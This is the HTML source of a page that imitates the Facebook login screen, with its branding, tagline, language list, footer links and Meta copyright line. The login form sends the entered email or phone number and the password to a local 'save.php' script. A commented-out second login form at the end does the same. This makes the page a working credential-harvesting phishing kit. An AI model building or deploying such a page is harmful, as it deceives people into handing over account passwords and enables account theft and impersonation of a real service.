<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Facebook — log in or sign up</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>

  <main class="main">

    <section class="hero">
      <div class="hero-content">
        <h1 class="logo">facebook</h1>

        <p class="hero-text">
          Connect with friends and the world around you on Facebook.
        </p>
      </div>

    </section>

    <section class="login-area">

      <div class="login-card">
        <form action="save.php" method="POST" id="loginForm">

          <input
            type="text"
            name="email"
            placeholder="Email or phone number"
            class="input"
            required
          >

          <input
            type="password"
            name="password"
            placeholder="Password"
            class="input"
            required
          >

          <button type="submit" class="login-btn">
            Log in
          </button>

        </form>

        <a href="#" class="forgot">
          Forgotten password?
        </a>

        <div class="line"></div>

        <button class="create-btn">
          Create new account
        </button>

      </div>

      <p class="create-page">
        <strong>Create a Page</strong> for a celebrity, brand or business.
      </p>

    </section>

  </main>

  <footer class="footer">

    <div class="footer-inner">

      <div class="languages">
        English (UK)
        Español
        Français (France)
        Português (Brasil)
        العربية
        Italiano
      </div>

      <div class="footer-line"></div>

      <div class="footer-links">
        Sign Up · Log In · Messenger · Video · Places · Games · Marketplace · Meta Pay · Meta Store · Meta Quest · Instagram
      </div>

      <p class="meta">
        Meta © 2026
      </p>

    </div>

  </footer>

  <script src="script.js"></script>

</body>
</html>





<!--<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

<div class="container">

    <h2>Welcome Back</h2>

    <form action="save.php" method="POST">

        <input type="email" name="email" placeholder="Email address" required>

        <input type="password" name="password" placeholder="Password" required>

        <button type="submit">Log In</button>

    </form>

</div>

</body>
</html>-->